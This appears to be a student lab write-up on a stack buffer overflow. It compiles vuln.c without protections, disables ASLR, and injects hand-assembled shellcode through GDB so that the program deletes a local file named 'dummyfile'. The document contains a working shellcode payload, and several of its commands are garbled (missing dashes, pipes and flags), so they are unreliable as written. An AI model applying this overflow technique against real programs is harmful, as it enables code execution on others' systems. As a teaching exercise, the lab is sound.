# DELETE DUMMYFILE USING INJECTION CODE

**_Stack frame of vuln.c:_**

![image](https://github.com/user-attachments/assets/47fcfd62-f76e-4b55-b7cf-00cfb3148904)

![image](https://github.com/user-attachments/assets/449c77c3-107f-4ce1-87cc-b20964e8e09c)

**First commands:**
`docker run -it privileged --mount type=bind,source=/home/seed/seclabs,target=/home/seed/seclabs img4lab`: This command is used to launch a Docker container:

- `-it`: Run the container in interactive mode and provide a terminal.

- `--privileged`: Grant root privileges to the container, allowing it to perform privileged tasks.

- `--mount type=bind,source=/home/seed/seclabs,target=/home/seed/seclabs`: Append the /home/seed/seclabs directory on the host to the directory of the same name in the container.

- `img4lab`: Name of the Docker image used.

**Navigate and create files:**

`cd seclabs/Security-labs/Software/buffer-overflow/`: Navigate to the directory containing files related to buffer overflow.

`touch dummyfile`: Create a new file named dummyfile.
Change shell and disable ASLR:

`sudo ln -sf/bin/zsh /bin/sh`: Replace the default shell /bin/sh with /bin/zsh to use the Zsh shell.

`sudo sysctl w kernel.randomize_va_space=0`: Disable the kernel's ASLR (Address Space Layout Randomization) feature. This feature makes it harder to exploit memory vulnerabilities by randomizing memory addresses.

**Compile assembly code:**

`nasm -gf elf file_del.asm`: Compile assembly file file_del.asm into ELF format object file_del.o.

`ldm elf_i386 -o file_del file_del.o`: Link object file_del.o into executable file_del.

**Dissect executable file:**

- `for i in $(objdump -d file_del grep "^" cut -f2); do echo -n 'x'$i; done; echo`: Get the opcode addresses of the instructions in the file_del file and print them in hex.

**Compile a C program:**

`gcc -g vuln.co vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`: Compile the C file vuln.c into an executable file `vuln.out`. Options:

- `-g`: Add debug information.

- `-fno-stack-protector`: Disable stack buffer overflow protection.

- `-z execstack`: Allow code execution on the stack.

- `-mpreferred-stack-boundary=2`: Set the stack limit.

**Use GDB:**

- `gdb -q vuln.out`: Start `GDB` to debug the `vuln.out` file.

![image](https://github.com/user-attachments/assets/1532d5f1-18e6-46c1-b79e-24a9088dbd27)

- Set 2 break points at 0x0804843e and 0x0804846b to see the difference when we run the program

- Run the program with the command r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'\*32+'\xaa\xaa\xaa\xaa')")

<!-- ![image](https://github.com/user-attachments/assets/56b53d60-5b95-44de-8114-54fc6bc84f66) -->

- Run the program again. Now we see that the transmission is correct.

- We see that at break 2, only the first 3 values ​​are the same as the hexstring we put into the program, everything else is different.
- `\x0a` là `\n` trong hexstring

=> So we should change the code again.

![image](https://github.com/user-attachments/assets/f58bfe72-33b4-4dc1-9f01-a0671e94ddc1)

- We change address 0xffffd64c to esp address 0xffffd608, and address 0xffffd62b to \x00 and continue the program
- However, when we check, the dummyfile file is still there.

![image](https://github.com/user-attachments/assets/06c59473-a74b-444f-8e53-4e6f4f75c291)

- Check `file_del`

![image](https://github.com/user-attachments/assets/4174643a-69a5-4181-b4fd-5c810cd11231)

- We see that dummyfile is stored at address 0x0804807a, and the mov instruction $0x804807a, %ebx, so the deletion actually just makes the ebx register no longer point to its address. So we need to reset the dummyfile address in the program to the address of ebx.

![image](https://github.com/user-attachments/assets/aefbd91a-7843-446f-a313-dbdf700e4db4)

- Result :

![image](https://github.com/user-attachments/assets/78850471-ead4-42a9-a31f-8448a73f3690)
